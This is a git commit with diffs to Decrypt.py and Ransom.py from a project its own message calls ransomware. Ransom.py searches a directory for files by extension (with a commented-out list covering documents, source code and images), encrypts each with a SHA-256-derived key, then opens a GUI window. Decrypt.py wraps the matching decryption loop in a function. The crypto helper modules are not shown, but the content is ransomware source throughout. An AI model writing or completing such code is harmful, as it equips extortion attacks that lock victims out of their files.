471c6c5bd940d96903426c499eb1673266157d37
D41JUNG0D <oonja1234@gmail.com>
2018-05-22 16:35:38 +0900

    Ransomware make Finished + GUI programming Finished

--- Decrypt.py
+++ Decrypt.py
@@ -2,21 +2,21 @@ import Search,hashlib
 from RansomModule import *
 from Get_data import *
 
-password = bytes(get_key(),encoding="utf-8")
-key = hashlib.sha256(password).digest()
+def decrypt():
+    password = bytes(get_key(), encoding="utf-8")
+    key = hashlib.sha256(password).digest()
 
-default_path = os.path.dirname(os.path.realpath(__file__))
-#default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"
-ext_list = [".dal"]
-file,directory = Search.search(default_path,ext_list)
+    default_path = os.path.dirname(os.path.realpath(__file__))
+    # default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"
+    ext_list = [".dal"]
+    file, directory = Search.search(default_path, ext_list)
 
-for i in file:
-    decrypt_file(key,i)
+    for i in file:
+        decrypt_file(key, i)
 
-print("Decrypted Finish!")
+    print("Decrypted Finish!")
 
 '''
-
 in_filename = 'secret.hwp'
 encrypt_file(key,in_filename)
 print("Encrypted!")
--- Ransom.py
+++ Ransom.py
@@ -1,6 +1,7 @@
 import hashlib,Search
 from RansomModule import *
 from Get_data import *
+from main_window import *
 
 password = bytes(get_key(),encoding="utf-8")
 key = hashlib.sha256(password).digest()
@@ -8,9 +9,19 @@ default_path = os.path.dirname(os.path.realpath(__file__))
 #default_path = "C:\\Users\\oonja\\Desktop\\Ransomware"
 
 ext_list = [".hwp"]
+''''
+ext_list = [".doc", ".hwp",".c",".cpp",
+".java",".ppt", ".pptx", ".pptm", ".jpg", 
+".png", ".jpeg", ".gif", ".bmp", ".txt"]
+'''
 file,directory = Search.search(default_path,ext_list)
 
 for i in file:
     encrypt_file(key,i)
 
 print("Encrypted Finish!")
+
+app = QApplication(sys.argv)
+myWindow = MyWindow()
+myWindow.show()
+app.exec_()
